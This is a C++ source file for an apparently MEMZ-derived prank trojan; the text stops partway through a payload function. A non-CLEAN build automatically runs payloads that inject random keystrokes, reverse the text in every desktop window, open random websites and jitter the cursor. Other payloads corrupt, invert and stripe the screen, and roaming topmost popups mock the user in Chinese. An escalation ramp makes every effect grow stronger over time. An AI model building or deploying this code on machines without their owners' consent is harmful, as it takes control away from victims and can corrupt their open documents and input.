#include "memz.h"
#include <math.h>

// Declare global variables from main.cpp
extern int nMonitors;
extern int scrx, scry, scrw, scrh;

PAYLOAD payloads[] = {
#ifdef CLEAN
    { payloadExecute,       L"\x6253\x5F00\x968F\x673A\x7F51\x7AD9/\x7A0B\x5E8F", NULL, 0,0,0,0, FALSE },
    { payloadCursor,        L"\x5149\x6807\x968F\x673A\x6296\x52A8",               NULL, 0,0,0,0, TRUE  },
    { payloadKeyboard,      L"\x968F\x673A\x952E\x76D8\x8F93\x5165",               NULL, 0,0,0,0, FALSE },
    { payloadSound,         L"\x968F\x673A\x9519\x8BEF\x58F0\x97F3",               NULL, 0,0,0,0, TRUE  },
    { payloadBlink,         L"\x5C4F\x5E55\x95EA\x70C1",                           NULL, 0,0,0,0, TRUE  },
    { payloadMessageBox,    L"\x5F39\x51FA\x6D88\x606F\x6846",                     NULL, 0,0,0,0, TRUE  },
    { payloadDrawErrors,    L"\x7ED8\x5236\x9519\x8BEF\x56FE\x6807",               NULL, 0,0,0,0, TRUE  },
    { payloadChangeText,    L"\x53CD\x8F6C\x6587\x672C",                           NULL, 0,0,0,0, FALSE },
    { payloadPIP,           L"\x96A7\x9053\x6548\x679C",                           NULL, 0,0,0,0, TRUE  },
    { payloadPuzzle,        L"\x5C4F\x5E55\x6545\x969C",                           NULL, 0,0,0,0, TRUE  },
    // ── Suierku-style new payloads ──────────────────────────────────────────
    { payloadGreenStripes,  L"\x82CF\x5C14\x514B\x7EFF\x8272\x6A2A\x7EB9",        NULL, 0,0,0,0, TRUE  },
    { payloadScreenJump,    L"\x5C4F\x5E55\x8DF3\x52A8\x6EDA\x52A8",              NULL, 0,0,0,0, TRUE  },
    { payloadScanCorrupt,   L"\x626B\x63CF\x7EBF\x8150\x8680",                   NULL, 0,0,0,0, TRUE  },
    { payloadIconStorm,     L"\x56FE\x6807\x98CE\x66B4",                           NULL, 0,0,0,0, TRUE  },
    { payloadGlitchBlocks,  L"\x6570\x5B57\x6545\x969C\x5757",                    NULL, 0,0,0,0, TRUE  },
    { payloadColorInvert,   L"\x533A\x57DF\x5F69\x8272\x53CD\x8F6C",              NULL, 0,0,0,0, TRUE  },
    { payloadTextRain,      L"\x6570\x5B57\u96E8\u5E55",                           NULL, 0,0,0,0, TRUE  },
    { payloadScreenShatter, L"\x5C4F\x5E55\x788E\x88C2",                          NULL, 0,0,0,0, TRUE  }
#else
    { payloadExecute,       30000 },
    { payloadCursor,        30000 },
    { payloadKeyboard,      20000 },
    { payloadSound,         50000 },
    { payloadBlink,         30000 },
    { payloadMessageBox,    20000 },
    { payloadDrawErrors,    10000 },
    { payloadChangeText,    40000 },
    { payloadPIP,           60000 },
    { payloadPuzzle,        15000 },
    { payloadGreenStripes,  25000 },
    { payloadScreenJump,    35000 },
    { payloadScanCorrupt,   45000 },
    { payloadIconStorm,     20000 },
    { payloadGlitchBlocks,  10000 },
    { payloadColorInvert,   30000 },
    { payloadTextRain,      20000 },
    { payloadScreenShatter, 55000 }
#endif
};

const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
BOOLEAN enablePayloads = TRUE;

// Audio level: 0.0 (silent) to 1.0 (loud). Updated by audioThread.
volatile float gAudioLevel = 0.0f;

// ─────────────────────────────────────────────────────────────────────────────
// Global intensity ramp system
// gIntensity() returns 0.0 (just started) → 1.0 (fully ramped, ~10 minutes)
// Curve: fast rise in first 2 min, then gradual plateau toward 1.0
// ─────────────────────────────────────────────────────────────────────────────
static DWORD gGlobalStartTime = 0;

// Call once at startup to record the start time
void initGlobalIntensity() {
    gGlobalStartTime = GetTickCount();
}

// Returns intensity in [0.0, 1.0].
// Uses a smooth S-curve so the ramp feels natural:
//   0 → 30s  : barely noticeable (0.0 – 0.08)
//   30s → 2min: clearly visible and growing (0.08 – 0.55)
//   2min → 5min: strong and aggressive (0.55 – 0.88)
//   5min+      : near maximum, asymptotically approaches 1.0
float gIntensity() {
    if (gGlobalStartTime == 0) return 0.0f;
    float sec = (float)(GetTickCount() - gGlobalStartTime) / 1000.0f;
    // Logistic / sigmoid-like curve: k controls steepness, x0 is midpoint
    // f(t) = 1 / (1 + exp(-k*(t - x0)))  mapped to [0,1]
    float k  = 0.018f;   // steepness: slower = more gradual
    float x0 = 150.0f;   // midpoint at 2.5 minutes
    float sig = 1.0f / (1.0f + expf(-k * (sec - x0)));
    // Remap from [sigmoid(0), 1] to [0, 1]
    float base = 1.0f / (1.0f + expf(k * x0)); // sigmoid at t=0
    float val  = (sig - base) / (1.0f - base);
    if (val < 0.0f) val = 0.0f;
    if (val > 1.0f) val = 1.0f;
    return val;
}

// Blend global intensity with per-payload runtime for fine-grained scaling.
// Returns a combined factor in [0.0, 1.0] where both global time AND
// per-payload invocation count contribute to the strength.
float payloadStrength(int times, int runtime) {
    float gi = gIntensity();
    // Per-payload local ramp: saturates at ~3000 ticks (30 seconds active)
    float local = (float)runtime / 3000.0f;
    if (local > 1.0f) local = 1.0f;
    // Combined: global gate * local warmup
    // When global is low, even a long-running payload stays weak.
    // When global is high, payload reaches full strength quickly.
    return gi * (0.3f + 0.7f * local);
}
// ─────────────────────────────────────────────────────────────────────────────
// rampDelay: returns a delay (in 10ms ticks) that shrinks as gIntensity grows.
//   At startup (gi≈0): delay ≈ base   (very infrequent)
//   At full (gi≈1):    delay ≈ minVal (maximum frequency)
// ─────────────────────────────────────────────────────────────────────────────
static int rampDelay(int base, int minVal) {
    float gi = gIntensity();
    float d  = (float)base * (1.0f - gi) + (float)minVal;
    int   di = (int)d;
    if (di < minVal) di = minVal;
    return di;
}



// ─────────────────────────────────────────────────────────────────────────────
// DC / coordinate helpers
// ─────────────────────────────────────────────────────────────────────────────

static WCHAR g_deviceName[32] = L"\\\\.\\DISPLAY1";

void setTargetDeviceName(int idx) {
    extern MONINFO monitors[];
    extern int nMonitors;
    if (idx >= 0 && idx < nMonitors)
        lstrcpyW(g_deviceName, monitors[idx].deviceName);
    else
        lstrcpyW(g_deviceName, L"");
}

static int getTargetOriginX() {
    int idx = getTargetMonitorIdx();
    if (idx >= 0 && idx < nMonitors) return monitors[idx].rect.left;
    return scrx;
}
static int getTargetOriginY() {
    int idx = getTargetMonitorIdx();
    if (idx >= 0 && idx < nMonitors) return monitors[idx].rect.top;
    return scry;
}
static int getTargetW() {
    int idx = getTargetMonitorIdx();
    if (idx >= 0 && idx < nMonitors)
        return monitors[idx].rect.right - monitors[idx].rect.left;
    return scrw;
}
static int getTargetH() {
    int idx = getTargetMonitorIdx();
    if (idx >= 0 && idx < nMonitors)
        return monitors[idx].rect.bottom - monitors[idx].rect.top;
    return scrh;
}

HDC getTargetDC() { return GetDC(NULL); }
void releaseTargetDC(HDC hdc) { ReleaseDC(NULL, hdc); }

// ─────────────────────────────────────────────────────────────────────────────
// Audio capture thread using WASAPI loopback
// ─────────────────────────────────────────────────────────────────────────────
#include <audioclient.h>
#include <mmdeviceapi.h>

DWORD WINAPI audioThread(LPVOID lParam) {
    CoInitialize(NULL);
    IMMDeviceEnumerator *pEnum = NULL;
    IMMDevice           *pDevice = NULL;
    IAudioClient        *pClient = NULL;
    IAudioCaptureClient *pCapture = NULL;
    WAVEFORMATEX        *pwfx = NULL;

    if (FAILED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL,
            __uuidof(IMMDeviceEnumerator), (void**)&pEnum))) goto cleanup;
    if (FAILED(pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice))) goto cleanup;
    if (FAILED(pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pClient))) goto cleanup;
    if (FAILED(pClient->GetMixFormat(&pwfx))) goto cleanup;
    if (FAILED(pClient->Initialize(AUDCLNT_SHAREMODE_SHARED,
            AUDCLNT_STREAMFLAGS_LOOPBACK, 10000000, 0, pwfx, NULL))) goto cleanup;
    if (FAILED(pClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCapture))) goto cleanup;
    pClient->Start();

    for (;;) {
        Sleep(20);
        UINT32 packetSize = 0;
        if (FAILED(pCapture->GetNextPacketSize(&packetSize))) break;
        float maxLevel = 0.0f;
        while (packetSize > 0) {
            BYTE *pData = NULL; UINT32 numFrames = 0; DWORD flags = 0;
            if (FAILED(pCapture->GetBuffer(&pData, &numFrames, &flags, NULL, NULL))) break;
            if (!(flags & AUDCLNT_BUFFERFLAGS_SILENT) && pwfx->wBitsPerSample == 32) {
                float *s = (float*)pData; int n = numFrames * pwfx->nChannels;
                float sum = 0.0f;
                for (int i = 0; i < n; i++) sum += s[i]*s[i];
                float rms = (float)sqrt(sum/n);
                if (rms > maxLevel) maxLevel = rms;
            } else if (!(flags & AUDCLNT_BUFFERFLAGS_SILENT) && pwfx->wBitsPerSample == 16) {
                short *s = (short*)pData; int n = numFrames * pwfx->nChannels;
                float sum = 0.0f;
                for (int i = 0; i < n; i++) { float v = s[i]/32768.0f; sum += v*v; }
                float rms = (float)sqrt(sum/n);
                if (rms > maxLevel) maxLevel = rms;
            }
            pCapture->ReleaseBuffer(numFrames);
            if (FAILED(pCapture->GetNextPacketSize(&packetSize))) goto cleanup;
        }
        // Amplify RMS so typical game audio (RMS ~0.05-0.2) maps to 0.3-1.0
        maxLevel *= 5.0f;
        if (maxLevel > 1.0f) maxLevel = 1.0f;
        // Fast attack (0.8), faster decay (0.3) to track beats in rhythm games
        float alpha = (maxLevel > gAudioLevel) ? 0.8f : 0.3f;
        gAudioLevel = gAudioLevel * (1.0f - alpha) + maxLevel * alpha;
    }
cleanup:
    if (pCapture) pCapture->Release();
    if (pClient)  { pClient->Stop(); pClient->Release(); }
    if (pDevice)  pDevice->Release();
    if (pEnum)    pEnum->Release();
    if (pwfx)     CoTaskMemFree(pwfx);
    CoUninitialize();
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// Payload thread
// ─────────────────────────────────────────────────────────────────────────────
DWORD WINAPI payloadThread(LPVOID parameter) {
#ifndef CLEAN
    int delay = 0, times = 0, runtime = 0;
#endif
    PAYLOAD *payload = (PAYLOAD*)parameter;
    for (;;) {
#ifdef CLEAN
        if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
            if (payload->delaytime++ >= payload->delay) {
                payload->delay = (payload->payloadFunction)(payload->times++, payload->runtime, FALSE);
                payload->delaytime = 0;
            }
            payload->runtime++;
        } else {
            payload->runtime = 0;
            payload->times   = 0;
            payload->delay   = 0;
        }
#else
        if (delay-- == 0) delay = (payload->payloadFunction)(times++, runtime);
        runtime++;
#endif
        Sleep(10);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// ── ORIGINAL PAYLOADS (unchanged) ────────────────────────────────────────────
// ─────────────────────────────────────────────────────────────────────────────

int payloadExecute(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        // Open browser with the search URL — SW_SHOWNOACTIVATE makes the window
        // visible but does NOT steal focus from the current foreground window.
        const char *url = sites[random() % nSites];
        SHELLEXECUTEINFOA sei = {};
        sei.cbSize       = sizeof(sei);
        sei.fMask        = SEE_MASK_NOASYNC | SEE_MASK_FLAG_NO_UI;
        sei.lpVerb       = "open";
        sei.lpFile       = url;
        sei.nShow        = SW_SHOWNOACTIVATE;
        ShellExecuteExA(&sei);
    }
    out: return rampDelay(3000, 200) + (random() % 100);
}

int payloadBlink(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        HDC hdc = getTargetDC();
        PatBlt(hdc, ox, oy, tw, th, PATINVERT);
        releaseTargetDC(hdc);
        float lvl = gAudioLevel;
        float gi  = gIntensity();
        // Base delay: 2000 ticks at startup, shrinks to 100 at full intensity
        // Audio makes it slightly faster but never below 100 ticks (1 sec)
        int delay = (int)(rampDelay(2000, 100) * (1.0f - lvl * 0.4f));
        if (delay < 100) delay = 100;  // hard floor: max 1 flash/sec
        return delay;
    }
    out: return rampDelay(2000, 100);  // max 1 flash/sec at full intensity
}

int payloadCursor(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        POINT cursor;
        GetCursorPos(&cursor);
        float lvl = gAudioLevel;
        int maxJitter = (int)(2 + lvl * 12);
        int jx = (random() % 3 - 1) * (random() % (runtime / 2200 + 2) + (int)(lvl * maxJitter));
        int jy = (random() % 3 - 1) * (random() % (runtime / 2200 + 2) + (int)(lvl * maxJitter));
        SetCursorPos(cursor.x + jx, cursor.y + jy);
    }
    out: return rampDelay(200, 2);
}

// ─────────────────────────────────────────────────────────────────────────────
// Popup message system — real system MessageBoxW, non-focus-stealing
// ─────────────────────────────────────────────────────────────────────────────

// Each entry: { title=L"\x7F51\x597D\x5361\x83CC" (网好卡菌), text (sarcastic), MB_flags }
static const struct {
    const WCHAR *title;
    const WCHAR *text;
    UINT         flags;
} g_popupMsgs[] = {
    // 0
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x54C8\x54C8\xFF0C\x4F60\x7684\x7535\x8111\x5361\x5F97\x50CF\x8001\x5E74\x673A\x4E00\x6837\x3002\n\x8981\x4E0D\x8981\x8003\x8651\x4E70\x53F0\x65B0\x7684\xFF1F",
      MB_OK | MB_ICONERROR },
    // 1
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x606D\x559C\x4F60\xFF01\x4F60\x7684\x7535\x8111\x6210\x529F\x8FDB\x5165\x4E86\x201C\x8D85\x7EA7\x5361\x987F\x201D\x6A21\x5F0F\x3002\n\x8FD9\x53EF\x662F\x72EC\x5BB6\x5B9A\x5236\x670D\x52A1\xFF01",
      MB_OK | MB_ICONWARNING },
    // 2
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x4F60\x8FD8\x5728\x7528\x8FD9\x53F0\x7535\x8111\x5417\xFF1F\n\x5C31\x8FD9\x914D\x7F6E\xFF0C\x771F\x7684\x52C7\x6C14\x53EF\x5609\x3002",
      MB_YESNO | MB_ICONQUESTION },
    // 3
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x68C0\x6D4B\x5230\x4F60\x7684CPU\x6B63\x5728\x7528\x751F\x547D\x5728\x8DE8\x8D8A\x3002\n\x5EFA\x8BAE\x5148\x7ED9\x5B83\x70B9\x4E2A\x9999\xFF0C\x518D\x7EE7\x7EED\x4E0B\x4E00\x6B65\x3002",
      MB_ABORTRETRYIGNORE | MB_ICONERROR },
    // 4
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x4F60\x7684\x5185\x5B58\x5DF2\x7ECF\x8D85\x8F7D\x4E86\x3002\n\x6211\x4E5F\x4E0D\x77E5\x9053\x4F60\x540C\x65F6\x5F00\x4E86\x591A\x5C11\x4E2A\x6807\x7B7E\x9875\xFF0C\x4F60\x81EA\x5DF1\x5FC3\x91CC\x6CA1\x6570\x5417\xFF1F",
      MB_RETRYCANCEL | MB_ICONWARNING },
    // 5
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x54C8\x54C8\xFF0C\x8FD9\x53F0\x7535\x8111\x5361\x5230\x8FDE\x9F20\x6807\x90FD\x62D6\x4E0D\x52A8\x4E86\x5427\xFF1F\n\x8981\x4E0D\x8981\x8BD5\x8BD5\x4F20\x7EDF\x7684\x201C\x5173\x673A\x91CD\x542F\x5927\x6CD5\x201D\xFF1F",
      MB_OKCANCEL | MB_ICONERROR },
    // 6
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x60A8\x7684\x7535\x8111\x5DF2\x88AB\x6211\x627F\x5305\x3002\n\x8BF7\x653E\x677E\xFF0C\x8FD9\x53EA\x662F\x4E00\x573A\x514D\x8D39\x4F53\x9A8C\x3002",
      MB_OK | MB_ICONINFORMATION },
    // 7
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x8FD9\x53F0\x7535\x8111\x7684\x6027\x80FD\x8BA9\x6211\x60F3\x8D77\x4E86\x6211\x7684\x7B2C\x4E00\x53F0\x7535\x8111\x3002\n\x4E0D\x8FC7\x90A3\x53F0\x81F3\x5C11\x8FD8\x80FD\x6D41\x7545\x5730\x5173\x673A\x3002",
      MB_YESNOCANCEL | MB_ICONQUESTION },
    // 8
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x8B66\x544A\xFF1A\x68C0\x6D4B\x5230\x4F60\x5DF2\x7ECF\x76EF\x7740\x5C4F\x5E5530\x79D2\x4E86\x3002\n\x8FD9\x5BF9\x4F60\x7684\x773C\x775B\x4E0D\x597D\xFF0C\x4F46\x5BF9\x6211\x5F88\x597D\x3002",
      MB_OK | MB_ICONWARNING },
    // 9
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x4F60\x7684\x7535\x8111\x6B63\x5728\x8FD0\x884C\x4E00\x4E2A\x975E\x5E38\x91CD\x8981\x7684\x4EFB\x52A1\xFF1A\n\x5C31\x662F\x8BA9\x4F60\x65E0\x6CD5\x6B63\x5E38\x5DE5\x4F5C\x3002",
      MB_OK | MB_ICONERROR },
    // 10
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x606D\x559C\x4F60\x7684\x7535\x8111\x83B7\x5F97\x4E86\x201C\x5E74\x5EA6\x6700\x5361\x5956\x201D\xFF01\n\x5956\x54C1\x662F\xFF1A\x7EE7\x7EED\x5361\x4E0B\x53BB\x3002",
      MB_OK | MB_ICONINFORMATION },
    // 11
    { L"\x7F51\x597D\x5361\x83CC",
      L"\x4F60\x5C1D\x8BD5\x5173\x6389\x6211\x5417\xFF1F\n\x54C8\x54C8\xFF0C\x6211\x5728\x4F60\x7684\x4EFB\x52A1\x680F\x91CC\x6392\x7B2C\x4E00\x4F4D\x3002",
      MB_YESNO | MB_ICONQUESTION },
};
static const int g_nPopupMsgs = 12;

// ─────────────────────────────────────────────────────────────────────────────
// Popup system  (real system MessageBoxW, never steals focus, windows roam)
// ─────────────────────────────────────────────────────────────────────────────

// ---------- close-all popups: enumerate this process's top-level windows -----
// Instead of a registration list (which has a race window between thread spawn
// and HCBT_ACTIVATE), we simply walk ALL top-level windows owned by this
// process and send IDCANCEL to any that look like a MessageBox (#32770).
// This is race-free: it doesn't matter whether the window was registered yet.
extern HWND mainWindow;  // defined in main.cpp
void closeAllPopups() {
    DWORD myPid = GetCurrentProcessId();
    struct Ctx { DWORD pid; HWND skip; };
    Ctx ctx = { myPid, mainWindow };
    EnumWindows([](HWND hw, LPARAM lp) -> BOOL {
        Ctx *c = (Ctx*)lp;
        if (hw == c->skip) return TRUE;          // don't close our own panel
        DWORD wPid = 0;
        GetWindowThreadProcessId(hw, &wPid);
        if (wPid != c->pid) return TRUE;          // different process
        WCHAR cls[64] = {};
        GetClassNameW(hw, cls, 63);
        if (lstrcmpW(cls, L"#32770") == 0) {      // dialog / MessageBox class
            PostMessageW(hw, WM_COMMAND, IDCANCEL, 0);
            PostMessageW(hw, WM_CLOSE,   0,        0);
        }
        return TRUE;
    }, (LPARAM)&ctx);
}
// stub kept so nothing else needs changing
static void popupRegister(HWND) {}

// ---------- shared roamer: moves a HWND to a random position every 600 ms ---
// The roamer thread receives the HWND via a heap-allocated HWND* and runs
// until the window is destroyed (FindWindow fails or IsWindow returns FALSE).
DWORD WINAPI roamerThread(LPVOID param) {
    HWND *ph = (HWND*)param;
    HWND  hw = *ph;
    delete ph;
    while (IsWindow(hw)) {
        RECT wr;
        GetWindowRect(hw, &wr);
        int cx = wr.right  - wr.left;
        int cy = wr.bottom - wr.top;
        if (cx <= 0) cx = 320;
        if (cy <= 0) cy = 160;
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(),       th = getTargetH();
        int rw = tw - cx; if (rw < 1) rw = 1;
        int rh = th - cy; if (rh < 1) rh = 1;
        int nx = ox + random() % rw;
        int ny = oy + random() % rh;
        // Move without activating — window stays behind current foreground
        SetWindowPos(hw, HWND_TOPMOST, nx, ny, 0, 0,
                     SWP_NOSIZE | SWP_NOACTIVATE | SWP_NOSENDCHANGING);
        Sleep(600);
    }
    return 0;
}

// ---------- CBT hook: initial placement + keep TOPMOST, no activation --------
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_ACTIVATE) {
        HWND hwnd = (HWND)wParam;
        RECT wr;
        GetWindowRect(hwnd, &wr);
        int cx = wr.right - wr.left;
        int cy = wr.bottom - wr.top;
        if (cx <= 0) cx = 320;
        if (cy <= 0) cy = 160;
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(),       th = getTargetH();
        int rw = tw - cx; if (rw < 1) rw = 1;
        int rh = th - cy; if (rh < 1) rh = 1;
        int nx = ox + random() % rw;
        int ny = oy + random() % rh;
        // Place at random position, TOPMOST, without stealing focus
        SetWindowPos(hwnd, HWND_TOPMOST, nx, ny, 0, 0,
                     SWP_NOSIZE | SWP_NOACTIVATE | SWP_NOSENDCHANGING);
        // Spawn roamer for this window
        HWND *ph = new HWND(hwnd);
        CreateThread(NULL, 0, roamerThread, ph, NULL, NULL);
        // Track this popup so Shift+O can close it
        popupRegister(hwnd);
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}

// ---------- normal sarcastic popup -------------------------------------------
DWORD WINAPI messageBoxThread(LPVOID parameter) {
    int idx = random() % g_nPopupMsgs;
    HHOOK hook = SetWindowsHookExW(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    // MB_USERICON (0) removes system sound; strip icon flags to silence beep
    UINT flags = g_popupMsgs[idx].flags & ~(MB_ICONERROR|MB_ICONWARNING|MB_ICONQUESTION|MB_ICONINFORMATION);
    HWND hw = NULL; // hook will register it
    MessageBoxW(NULL,
        g_popupMsgs[idx].text,
        g_popupMsgs[idx].title,
        flags);
    UnhookWindowsHookEx(hook);
    return 0;
}

int payloadMessageBox(PAYLOADFUNC) {
    PAYLOADHEAD
    CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
    out: return rampDelay(12000, 800) + (random() % 200);
}

int payloadChangeText(PAYLOADFUNC) {
    PAYLOADHEAD
    EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
    out: return rampDelay(600, 50);
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);
    if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8191, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
        strReverseW(str);
        SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
    }
    GlobalFree(str);
    return TRUE;
}

int payloadSound(PAYLOADFUNC) {
    PAYLOADHEAD
#ifdef CLEAN
    PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
    out: return rampDelay(2000, 50) + (random() % 50);
#else
    PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
    out: return rampDelay(2000, 50) + (random() % 50);
#endif
}

int payloadPuzzle(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        HDC hdc = getTargetDC();
        float lvl = gAudioLevel;
        int maxW = (int)(50 + lvl * 550);
        int maxH = (int)(50 + lvl * 550);
        if (maxW > tw) maxW = tw;
        if (maxH > th) maxH = th;

        int x1 = ox + random() % (tw - maxW + 1);
        int y1 = oy + random() % (th - maxH + 1);
        int x2 = ox + random() % (tw - maxW + 1);
        int y2 = oy + random() % (th - maxH + 1);
        int w  = random() % maxW + 1;
        int h  = random() % maxH + 1;
        if (x1 - ox + w > tw) w = tw - (x1 - ox);
        if (y1 - oy + h > th) h = th - (y1 - oy);
        if (x2 - ox + w > tw) w = tw - (x2 - ox);
        if (y2 - oy + h > th) h = th - (y2 - oy);
        if (w < 1) w = 1;
        if (h < 1) h = 1;
        BitBlt(hdc, x1, y1, w, h, hdc, x2, y2, SRCCOPY);
        releaseTargetDC(hdc);
        int baseD1 = rampDelay(1000, 5);
        int delay = (int)(baseD1 * (1.0f - lvl * 0.6f));
        if (delay < 1) delay = 1;
        return delay;
    }
    out: return rampDelay(1000, 5);
}

int payloadKeyboard(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        INPUT input = {};
        input.type   = INPUT_KEYBOARD;
        input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
        SendInput(1, &input, sizeof(INPUT));
    }
    out: return rampDelay(6000, 300) + (random() % 200);
}

int payloadPIP(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        float lvl = gAudioLevel;

        int inset = (int)(2 + (times / 10) + lvl * 20);
        if (inset > tw / 3) inset = tw / 3;
        if (inset > th / 3) inset = th / 3;
        int dstW = tw - 2 * inset;
        int dstH = th - 2 * inset;
        if (dstW < 4) dstW = 4;
        if (dstH < 4) dstH = 4;

        HDC desktopDC = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(desktopDC);
        HBITMAP hBmp = CreateCompatibleBitmap(desktopDC, tw, th);
        HBITMAP hOld = (HBITMAP)SelectObject(memDC, hBmp);
        SetStretchBltMode(desktopDC, HALFTONE);
        BitBlt(memDC, 0, 0, tw, th, desktopDC, ox, oy, SRCCOPY);

        StretchBlt(desktopDC,
                   ox + inset, oy + inset, dstW, dstH,
                   memDC, 0, 0, tw, th, SRCCOPY);

        SelectObject(memDC, hOld);
        DeleteObject(hBmp);
        DeleteDC(memDC);
        ReleaseDC(NULL, desktopDC);
    }
    out: return rampDelay(500, 16);
}

int payloadDrawErrors(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ix = GetSystemMetrics(SM_CXICON) / 2;
        int iy = GetSystemMetrics(SM_CYICON) / 2;
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(),       th = getTargetH();
        HDC hdc = getTargetDC();
        POINT cursor;
        GetCursorPos(&cursor);
        int lx = cursor.x - ox;
        int ly = cursor.y - oy;
        if (lx >= 0 && lx < tw && ly >= 0 && ly < th)
            DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
        float lvl = gAudioLevel;
        int extraIcons = (int)(lvl * 5);
        if (random() % (int)(10/(times/500.0+1)+1) == 0 || extraIcons > 0) {
            int n = 1 + extraIcons;
            for (int i = 0; i < n; i++)
                DrawIcon(hdc,
                         ox + random() % tw,
                         oy + random() % th,
                         LoadIcon(NULL, IDI_WARNING));
        }
        releaseTargetDC(hdc);
    }
    out: return rampDelay(500, 2);
}

// ─────────────────────────────────────────────────────────────────────────────
// ── SUIERKU-STYLE NEW PAYLOADS ────────────────────────────────────────────────
// ─────────────────────────────────────────────────────────────────────────────

// Helper: HSV to COLORREF
static COLORREF HSVtoRGB(float h, float s, float v) {
    float r=0,g=0,b=0;
    int i = (int)(h*6);
    float f = h*6 - i;
    float p = v*(1-s), q = v*(1-f*s), t = v*(1-(1-f)*s);
    switch(i%6){
        case 0: r=v; g=t; b=p; break;
        case 1: r=q; g=v; b=p; break;
        case 2: r=p; g=v; b=t; break;
        case 3: r=p; g=q; b=v; break;
        case 4: r=t; g=p; b=v; break;
        case 5: r=v; g=p; b=q; break;
    }
    return RGB((int)(r*255),(int)(g*255),(int)(b*255));
}

// ── 1. Green Horizontal Stripes (苏尔克标志性绿色横纹) ────────────────────────
// Draws animated green scan-lines that scroll downward, mimicking the
// signature green-stripe corruption seen in Suierku virus phase 2.
int payloadGreenStripes(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        HDC hdc = getTargetDC();
        float lvl = gAudioLevel;

        // Number of stripes scales with audio level and time
        int nStripes = 8 + (int)(lvl * 20) + (times / 30);
        if (nStripes > 60) nStripes = 60;

        // Stripe thickness: thin at first, thicker over time
        int stripeH = 2 + (times / 200);
        if (stripeH > 12) stripeH = 12;

        // Phase offset makes stripes scroll downward
        int phase = (times * 4) % th;

        for (int i = 0; i < nStripes; i++) {
            // Distribute stripes across screen height with scroll offset
            int y = oy + (phase + i * (th / nStripes)) % th;

            // Vary green intensity: bright lime to dark green
            int greenVal = 120 + (random() % 136);
            int redVal   = (int)(lvl * 40);
            COLORREF col = RGB(redVal, greenVal, 0);

            HBRUSH brush = CreateSolidBrush(col);
            RECT rc = { ox, y, ox + tw, y + stripeH };
            FillRect(hdc, &rc, brush);
            DeleteObject(brush);

            // Occasionally draw a brighter "flash" stripe
            if (random() % 8 == 0) {
                HBRUSH flashBrush = CreateSolidBrush(RGB(80, 255, 80));
                RECT flashRc = { ox, y, ox + tw, y + 1 };
                FillRect(hdc, &flashRc, flashBrush);
                DeleteObject(flashBrush);
            }
        }

        // Draw a vertical green glitch bar on random position
        if (random() % 4 == 0) {
            int bx = ox + random() % tw;
            int bw = 2 + random() % 8;
            HBRUSH vBrush = CreateSolidBrush(RGB(0, 200 + random()%56, 0));
            RECT vRc = { bx, oy, bx + bw, oy + th };
            FillRect(hdc, &vRc, vBrush);
            DeleteObject(vBrush);
        }

        releaseTargetDC(hdc);

        int baseD2 = rampDelay(1200, 80);
        int baseD3 = rampDelay(800, 8);
        int delay = (int)(baseD3 * (1.0f - lvl * 0.4f));
        if (delay < 8) delay = 8;
        return delay;
    }
    out: return rampDelay(1200, 80);
}

// ── 2. Screen Jump / Scroll (屏幕跳动滚动) ────────────────────────────────────
// Captures the screen and redraws it shifted vertically (up or down),
// simulating the "screen jumping" effect characteristic of Suierku phase 1.
int payloadScreenJump(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
